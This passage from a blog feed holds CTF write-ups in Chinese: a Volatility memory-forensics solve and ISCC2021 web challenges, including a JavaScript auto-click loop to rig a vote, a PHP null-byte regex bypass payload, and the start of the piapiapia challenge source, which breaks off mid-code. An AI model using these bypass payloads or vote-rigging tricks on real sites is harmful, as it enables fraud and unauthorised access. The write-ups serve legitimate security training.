class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86  memdump -p 536 -D ./  <br>Volatility Foundation Volatility Framework 2.6<br>************************************************************************<br>Writing smss.exe [   536] to 536.dmp<br></code></pre></td></tr></table></figure><p>4.查看dump信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ strings -e l 536.dmp | grep flag<br>flag.jpg<br>flag.png<br>flag.jpg<br>flag.jpg<br>flag.jpg<br>flag.jpg<br>flag.png<br>flag.png<br>flag.png<br>flag.jpg<br>flag.jpg<br>flag.png<br>flag.lnk<br>flag.jpg<br>\flag.jpg*C:\Documents and Settings\Administrator\<br>flag.png<br>flag.jpg<br>flag.lnk<br>notiflag.exe<br>\Documents and Settings\Administrator\Recent\flag.lnk<br>flag.png<br>flag.jpg<br>flag.png<br>flag.png<br>flag.jpg<br>flag.lnk<br>flag.jpg<br>flag.lnk<br>flag.jpg<br>flag.png<br>\flag.jpg<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>flag.png<br> 1\flag.jpg<br>\flag.jpg<br>flag.jpg<br>\flag.jpg<br>flag.png<br>flag.lnk<br>flag.png<br>\flag.jpg.jpg<br>\flag.png<br> 1\flag.jpg<br>\Device\HarddiskVolume1\Documents and Settings\Administrator\Recent\flag.lnk<br>\flag.jpg<br>\flag.jpg<br>flag.jpg<br>\flag.jpg<br>\flag.jpg<br>\Device\HarddiskVolume1\Documents and Settings\Administrator\Recent\flag.lnk<br>\flag.png<br> 1\flag.png<br>\flag.jpg<br>\flag.png<br>flag.png<br>flag.jpg<br>usbflags<br>usbflags<br>usbflags<br>usbflags\vvvvpppprrrr<br>usbflags<br></code></pre></td></tr></table></figure><p>可疑文件flag.jpg和flag.png</p><p>5.获取浏览器浏览历史</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 iehistory<br>Volatility Foundation Volatility Framework 2.6<br></code></pre></td></tr></table></figure><p>在大师傅博客里面能看到hint.txt，但我这里啥也没有，继续往下看吧</p><p>6.扫描并提取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 filescan | grep hint<br>Volatility Foundation Volatility Framework 2.6<br>0x0000000002456028      1      0 RW-r-- \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\hint.txt<br></code></pre></td></tr></table></figure><p>7.使用dumpfiles提取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002456028 -D ./<br>Volatility Foundation Volatility Framework 2.6<br>DataSectionObject 0x02456028   None   \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\hint.txt<br></code></pre></td></tr></table></figure><p>得到file.None.0x821231b8.dat<br><img src="https://img-blog.csdnimg.cn/20210603204442392.png" alt="在这里插入图片描述"><br>修改后缀为txt，hint提示文件名为fl4g</p><p>8.扫描查找fl4g文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 filescan | grep fl4g                 <br>Volatility Foundation Volatility Framework 2.6<br>0x0000000002052028      1      0 R--rw- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\fl4g.zip<br></code></pre></td></tr></table></figure><p>9.把fl4g文件dump下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002052028 -D ./<br>Volatility Foundation Volatility Framework 2.6<br>DataSectionObject 0x02052028   None   \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\fl4g.zip<br></code></pre></td></tr></table></figure><p>修改后缀为zip，解压出来flag.png和flag.jpg</p><p>10.LSB双图隐写<br>先用StegSlove打开flag.png，然后点击Analyse-&gt;Image Combiner打开flag.jpg，进行异或会得到二维码<br><img src="https://img-blog.csdnimg.cn/20210603205142989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>11.扫码解flag</p><p>二维码信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://fanyi.baidu.com/translate?aldtype=16047&amp;query=%E6%B0%9F%E5%BE%95%E6%A0%BC%E4%B9%83%E9%8C%B5%E6%89%A9%E5%8F%B7%E6%AC%B8%E5%BF%85%E8%A5%BF%E5%BC%9F%E4%BA%BF%E8%89%BE%E8%99%8E%E9%94%AF%E9%8C%B5%E6%89%A9%E5%8F%B7&amp;keyfrom=baidu&amp;smartresult=dict&amp;lang=auto2zh<span class="hljs-comment">#zh/en/%E6%B0%9F%E5%BE%95%E6%A0%BC%E4%B9%83%E9%8C%B5%E6%89%A9%E5%8F%B7%E6%AC%B8%E5%BF%85%E8%A5%BF%E5%BC%9F%E4%BA%BF%E8%89%BE%E8%99%8E%E9%94%AF%E9%8C%B5%E6%89%A9%E5%8F%B7</span><br></code></pre></td></tr></table></figure><p>根据读音最终flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;abcdefg&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装Volatility&quot;&gt;&lt;a href=&quot;#安装Volatility&quot; class=&quot;headerlink&quot; title=&quot;安装Volatility&quot;&gt;&lt;/a&gt;安装Volatility&lt;/h2&gt;&lt;p&gt;新版kali不自带Volatility，需要自己安装源码编译</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="MISC" scheme="https://swhat.github.io/categories/CTF/MISC/"/>
    
    
    <category term="流量分析" scheme="https://swhat.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2021 Web WP</title>
    <link href="https://swhat.github.io/2021/05/27/ISCC2021-Web-WP/"/>
    <id>https://swhat.github.io/2021/05/27/ISCC2021-Web-WP/</id>
    <published>2021-05-27T12:26:07.000Z</published>
    <updated>2021-08-15T03:59:06.654Z</updated>
    
    <content type="html"><![CDATA[ <a id="more"></a><h1 id="练武"><a href="#练武" class="headerlink" title="练武"></a>练武</h1><h2 id="ISCC客服冲冲冲（一）"><a href="#ISCC客服冲冲冲（一）" class="headerlink" title="ISCC客服冲冲冲（一）"></a>ISCC客服冲冲冲（一）</h2><blockquote><p>又到了一年一度的ISCC，客服一号为了保住饭碗（被迫）参与了今年的客服海选投票。经过激烈的角逐，客服一号终于凭借着自己多年的客服经验来到决赛的舞台，却发现对手竟是自己？？？<br>请帮助真正的客服一号在投票中取胜，保住客服一号的饭碗！ 题目入口：<a href="http://39.96.91.106:7020/">http://39.96.91.106:7020</a></p></blockquote><p><strong>方法一</strong>：使用连点器<br>设置每秒点击100次，得到flag<br><img src="https://img-blog.csdnimg.cn/20210501144653201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>方法二</strong>：修改按钮ID<br>F12将两个按钮的id交换<img src="https://img-blog.csdnimg.cn/20210505160357289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>方法三</strong>：<br>js调用click函数，控制台输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">setInterval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;left_button&quot;</span>).click();&#125;,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><strong>方法四</strong>：刷票</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">local_left_votes=<span class="hljs-number">999999</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210505162648614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="这是啥"><a href="#这是啥" class="headerlink" title="这是啥"></a>这是啥</h2><blockquote><p>这是什么东西呢？<br>题目入口：<a href="http://39.96.91.106:7030/">http://39.96.91.106:7030</a></p></blockquote><p>下载附件，将jsfuck编码丢到控制台得到flag<br><img src="https://img-blog.csdnimg.cn/20210501112110324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="正则匹配最后的倔强。"><a href="#正则匹配最后的倔强。" class="headerlink" title="正则匹配最后的倔强。"></a>正则匹配最后的倔强。</h2><p>按照提示访问robots.txt，不允许所有人访问/src/code/code.txt<br><img src="https://img-blog.csdnimg.cn/20210502115331384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问/code/code.txt得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>&lt;p&gt;code.txt&lt;/p&gt;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>     <br><span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&quot;/^[a-zA-Z0-9]+$/&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;<br><br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)<br>&#123;    <br>    <br><span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;*-*&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Bugku原题，传入的值必须是数字或大小写字符，长度小于8且大于9999999,且匹配到”-“才能输出flag。可以使用%00来截断，当ereg函数读到 %00的时候，就截止了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1e8</span>%<span class="hljs-number">00</span>*-*<br></code></pre></td></tr></table></figure><p>flag：<br><img src="https://img-blog.csdnimg.cn/20210502115236778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="ISCC{1SCc-202i}"></p><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><blockquote><p>登录来上传自己的信息吧！<br>题目入口：<a href="http://39.96.91.106:7010/">http://39.96.91.106:7010</a></p></blockquote><p>这是一道原题： [0CTF 2016] piapiapia,参考<a href="https://www.cnblogs.com/litlife/p/11690918.html#0x02-0ctf-2016-piapiapia">wp</a><br><img src="https://img-blog.csdnimg.cn/20210504124735854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><a href="http://www.zip源码泄露,可直接下载源码./">www.zip源码泄露，可直接下载源码。</a><br><img src="https://img-blog.csdnimg.cn/20210501145644459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>源码如下：</p><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">mysql</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_exists</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$key_list</span> = <span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br><span class="hljs-variable">$value_list</span> = <span class="hljs-keyword">Array</span>(<span class="hljs-variable">$username</span>, md5(<span class="hljs-variable">$password</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::insert(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> &amp;&amp; <span class="hljs-variable">$object</span>-&gt;password === md5(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>-&gt;profile;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::update(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$link</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"><span class="hljs-variable">$config</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;link = mysql_connect(<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>],<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>);<br>mysql_select_db(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>]);<br>mysql_query(<span class="hljs-string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;link;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$ret</span> = <span class="hljs-string">&#x27;*&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT <span class="hljs-subst">$ret</span> FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>, <span class="hljs-keyword">$this</span>-&gt;link);<br><span class="hljs-keyword">return</span> mysql_fetch_object(<span class="hljs-variable">$result</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span></span>) </span>&#123;<br><span class="hljs-variable">$key</span> = implode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$key_list</span>);<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;\&#x27;&#x27;</span> . implode(<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="hljs-variable">$value_list</span>) . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>; <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO <span class="hljs-subst">$table</span> (<span class="hljs-subst">$key</span>) VALUES (<span class="hljs-subst">$value</span>)&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = preg_replace(<span 